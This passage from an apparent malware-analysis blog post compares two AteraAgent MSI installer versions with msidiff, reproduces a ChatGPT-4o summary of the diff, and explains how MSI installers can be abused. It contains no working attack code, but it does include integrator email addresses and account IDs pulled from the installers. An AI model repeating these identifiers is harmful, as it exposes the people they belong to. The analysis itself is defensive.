+-install 3090 AteraAgent.exe /i /IntegratorLogin=&amp;#34;[INTEGRATORLOGIN]&amp;#34; /CompanyId=&amp;#34;[COMPANYID]&amp;#34; /IntegratorLoginUI=&amp;#34;[INTEGRATORLOGINUI]&amp;#34; /CompanyIdUI=&amp;#34;[COMPANYIDUI]&amp;#34; /FolderId=&amp;#34;[FOLDERID]&amp;#34; /AccountId=&amp;#34;[ACCOUNTID]&amp;#34;
+&amp;#43;install 3090 AteraAgent.exe /i /IntegratorLogin=&amp;#34;[INTEGRATORLOGIN]&amp;#34; /CompanyId=&amp;#34;[COMPANYID]&amp;#34; /IntegratorLoginUI=&amp;#34;[INTEGRATORLOGINUI]&amp;#34; /CompanyIdUI=&amp;#34;[COMPANYIDUI]&amp;#34; /FolderId=&amp;#34;[FOLDERID]&amp;#34; /AccountId=&amp;#34;[ACCOUNTID]&amp;#34; /AgentId=&amp;#34;[AGENTID]&amp;#34;
+uninstall 3154 AteraAgent.exe /u
+DeleteTaskScheduler 3170 INSTALLFOLDER SCHTASKS.EXE /delete /tn &amp;#34;Monitoring Recovery&amp;#34; /f
+diff -r -Nup old/File.idt new/File.idt
+--- old/File.idt 2024-07-08 11:40:27
+&amp;#43;&amp;#43;&amp;#43; new/File.idt 2024-07-08 11:40:27
+@@ -1,10 &amp;#43;1,10 @@ File File
+File Component_ FileName FileSize Version Language Attributes Sequence
+s72 s72 l255 i4 S72 S20 I2 i4
+File File
+-AteraAgent.exe AteraAgent.exe culrpfxg.exe|AteraAgent.exe 144224 1.8.6.7 0 512 1
+&amp;#43;AteraAgent.exe AteraAgent.exe culrpfxg.exe|AteraAgent.exe 145968 1.8.7.2 0 512 1
+AteraAgent.exe.config AteraAgent.exe.config 7uho0yn3.con|AteraAgent.exe.config 1442 512 2
+-ICSharpCode.SharpZipLib.dll ICSharpCode.SharpZipLib.dll fd-i8f6f.dll|ICSharpCode.SharpZipLib.dll 214880 1.3.3.11 0 512 4
+-Newtonsoft.Json.dll Newtonsoft.Json.dll e8lrglzz.dll|Newtonsoft.Json.dll 709984 13.0.2.27524 0 512 5
+-PubNub.dll PubNub.dll Pubnub.dll 602464 6.13.0.0 0 512 6
+-System.ValueTuple.dll System.ValueTuple.dll 7t1dchnb.dll|System.ValueTuple.dll 73056 4.6.26515.6 0 512 7
+-BouncyCastle.Crypto.dll BouncyCastle.Crypto.dll 8kw0ybbq.dll|BouncyCastle.Crypto.dll 3318624 1.9.0.1 0 512 3
+&amp;#43;ICSharpCode.SharpZipLib.dll ICSharpCode.SharpZipLib.dll fd-i8f6f.dll|ICSharpCode.SharpZipLib.dll 215088 1.3.3.11 0 512 4
+&amp;#43;Newtonsoft.Json.dll Newtonsoft.Json.dll e8lrglzz.dll|Newtonsoft.Json.dll 710192 13.0.2.27524 0 512 5
+&amp;#43;PubNub.dll PubNub.dll Pubnub.dll 602672 6.13.0.0 0 512 6
+&amp;#43;System.ValueTuple.dll System.ValueTuple.dll 7t1dchnb.dll|System.ValueTuple.dll 73264 4.6.26515.6 0 512 7
+&amp;#43;BouncyCastle.Crypto.dll BouncyCastle.Crypto.dll 8kw0ybbq.dll|BouncyCastle.Crypto.dll 3318832 1.9.0.1 0 512 3
+diff -r -Nup old/InstallExecuteSequence.idt new/InstallExecuteSequence.idt
+--- old/InstallExecuteSequence.idt 2024-07-08 11:40:27
+&amp;#43;&amp;#43;&amp;#43; new/InstallExecuteSequence.idt 2024-07-08 11:40:27
+@@ -11,6 &amp;#43;11,11 @@ PublishProduct 6400
+InstallFinalize 6600
+PublishFeatures 6300
+PublishProduct 6400
+&amp;#43;GenerateAgentId (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) AND (NOT SKIPCLEANUP) 96
+&amp;#43;ReportInstallationStart (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) AND (NOT SKIPCLEANUP) 97
+&amp;#43;ReportInstallationEnd (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) AND (NOT SKIPCLEANUP) 6601
+&amp;#43;ReportInstallationFailure (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) AND (NOT SKIPCLEANUP) -3
+&amp;#43;ReportInstallationUserCancel (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) AND (NOT SKIPCLEANUP) -2
+SetCustomActionPropertyValues 1602
+PostUninstallCleanup (NOT UPGRADINGPRODUCTCODE) AND (REMOVE=&amp;#34;ALL&amp;#34;) 1604
+PormptInstallationDialog (Installed = &amp;#34;&amp;#34;) AND (REINSTALL = &amp;#34;&amp;#34;) AND (UPGRADINGPRODUCTCODE = &amp;#34;&amp;#34;) AND (REMOVE = &amp;#34;&amp;#34;) 98
+diff -r -Nup old/Property.idt new/Property.idt
+--- old/Property.idt 2024-07-08 11:40:26
+&amp;#43;&amp;#43;&amp;#43; new/Property.idt 2024-07-08 11:40:27
+@@ -7,11 &amp;#43;7,11 @@ Manufacturer Atera networks
+ALLUSERS 1
+REINSTALLMODE dmus
+Manufacturer Atera networks
+-ProductCode {C5F5A288-85FF-4257-AF69-D5910E6268B5}
+&amp;#43;ProductCode {E732A0D7-A2F2-4657-AC41-B19742648E45}
+ProductLanguage 1033
+ProductName AteraAgent
+-ProductVersion 1.8.6.7
+&amp;#43;ProductVersion 1.8.7.2
+SecureCustomProperties NETFRAMEWORK35;PREVIOUSFOUND;WIX_UPGRADE_DETECTED
+-INTEGRATORLOGIN mcsamaniego@mre.gov.py
+&amp;#43;INTEGRATORLOGIN eduardomonica00214@hotmail.com
+COMPANYID 1
+-ACCOUNTID 001Q3000008IyacIAC
+&amp;#43;ACCOUNTID 001Q300000AVzB7IAL
+diff -r -Nup old/_SummaryInformation.idt new/_SummaryInformation.idt
+--- old/_SummaryInformation.idt 2024-07-08 11:40:26
+&amp;#43;&amp;#43;&amp;#43; new/_SummaryInformation.idt 2024-07-08 11:40:27
+@@ -8,9 &amp;#43;8,9 @@ _SummaryInformation PropertyId
+5 Installer
+6 This installer database contains the logic and data required to install AteraAgent.
+7 Intel;1033
+-9 {D42E1648-2328-41CB-BC72-C0B32D77958E}
+-12 2023/09/26 10:17:42
+-13 2023/09/26 10:17:42
+&amp;#43;9 {721AD955-79FD-4019-BBF5-9DCC4C1175BB}
+&amp;#43;12 2024/02/28 04:52:02
+&amp;#43;13 2024/02/28 04:52:02
+14 200
+15 6
+18 Windows Installer XML Toolset (3.11.2.4516)
+diff -r -Nup old/signature new/signature[...]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Based on the output the changes are in the following tables:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CustomAction&lt;/code&gt;, &lt;code&gt;File&lt;/code&gt;, &lt;code&gt;InstallExecuteSequence&lt;/code&gt;, &lt;code&gt;Property&lt;/code&gt;, &lt;code&gt;ProductCode&lt;/code&gt;,
+&lt;code&gt;ProductVersion&lt;/code&gt;, and &lt;code&gt;_SummaryInformation&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Using AI to Parse the Output of MSIDIFF&lt;span class="hx:absolute hx:-mt-20" id="using-ai-to-parse-the-output-of-msidiff"&gt;&lt;/span&gt;
+&lt;a href="#using-ai-to-parse-the-output-of-msidiff" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We can use generative AI to make the output more user-friendly and derive our
+conclusions. We have used ChatGPT4-o with the following prompt:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;You are experienced malware analysts. Parse and summarize the output of
+msidiff utility based on the provided input.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Next, we gave it the output of the msidiff command and got the following
+result:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;The `msidiff` utility output shows the differences between two MSI package versions. Here&amp;#39;s a summary of the changes:
+### CustomAction.idt
+- **Added Custom Actions:**
+- `GenerateAgentId` with target `GenerateAgentId`
+- `ReportInstallationStart` with target `ReportMsiStart`
+- `ReportInstallationEnd` with target `ReportMsiEnd`
+- `ReportInstallationFailure` with target `ReportMsiFailure`
+- `ReportInstallationUserCancel` with target `ReportMsiUserCancel`
+- **Modified Custom Action:**
+- `install` action now includes an additional parameter `/AgentId=&amp;#34;[AGENTID]&amp;#34;`
+### File.idt
+- **Modified File Sizes:**
+- `AteraAgent.exe` updated from `144224` bytes to `145968` bytes
+- `ICSharpCode.SharpZipLib.dll` updated from `214880` bytes to `215088` bytes
+- `Newtonsoft.Json.dll` updated from `709984` bytes to `710192` bytes
+- `PubNub.dll` updated from `602464` bytes to `602672` bytes
+- `System.ValueTuple.dll` updated from `73056` bytes to `73264` bytes
+- `BouncyCastle.Crypto.dll` updated from `3318624` bytes to `3318832` bytes
+### InstallExecuteSequence.idt
+- **Added Installation Steps:**
+- `GenerateAgentId` with condition and sequence number `96`
+- `ReportInstallationStart` with condition and sequence number `97`
+- `ReportInstallationEnd` with condition and sequence number `6601`
+- `ReportInstallationFailure` with condition and sequence number `-3`
+- `ReportInstallationUserCancel` with condition and sequence number `-2`
+### Property.idt
+- **Updated Product Information:**
+- `ProductCode` changed from `{C5F5A288-85FF-4257-AF69-D5910E6268B5}` to `{E732A0D7-A2F2-4657-AC41-B19742648E45}`
+- `ProductVersion` updated from `1.8.6.7` to `1.8.7.2`
+- `INTEGRATORLOGIN` updated from `mcsamaniego@mre.gov.py` to `eduardomonica00214@hotmail.com`
+- `ACCOUNTID` updated from `001Q3000008IyacIAC` to `001Q300000AVzB7IAL`
+### _SummaryInformation.idt
+- **Updated Summary Information:**
+- `ProductCode` changed from `{D42E1648-2328-41CB-BC72-C0B32D77958E}` to `{721AD955-79FD-4019-BBF5-9DCC4C1175BB}`
+- Creation and modification dates updated to `2024/02/28 04:52:02`
+### General Summary
+The changes indicate updates to the custom actions, file versions and sizes, installation sequences, and product properties. The new version of the MSI includes additional custom actions primarily focused on reporting installation statuses and generating agent IDs. There are also updates to the executable and library files, reflecting changes in file sizes and potentially code updates. Additionally, product metadata, such as version numbers and user-specific properties, have been updated.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;We see some changes in the custom actions, the different email addresses that
+were used, the updated &lt;code&gt;ProductVersion&lt;/code&gt;, and the creation date.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;span class="hx:absolute hx:-mt-20" id="conclusion"&gt;&lt;/span&gt;
+&lt;a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;MSI files, widely used for software installation on Windows systems, offer a
+standardized and efficient method for deploying software but are also
+attractive targets for threat actors. These files can be exploited to deliver
+and execute malicious payloads, leveraging their trusted status and complex
+structure to evade detection.&lt;/p&gt;
+&lt;p&gt;Understanding the structure and functionality of MSI files, including their
+database tables, custom actions, and installation sequences, is essential for
+identifying potential threats. Tools such as &lt;code&gt;msitools&lt;/code&gt;, &lt;code&gt;msidump&lt;/code&gt;, &lt;code&gt;lessmsi&lt;/code&gt;,
+and MSI Viewer provide valuable capabilities for inspecting and analyzing MSI
+files. By examining key tables like &lt;code&gt;CustomAction&lt;/code&gt; and &lt;code&gt;File&lt;/code&gt;, security
+professionals can detect and mitigate risks associated with malicious MSI
+installers.&lt;/p&gt;</description></item></channel></rss>
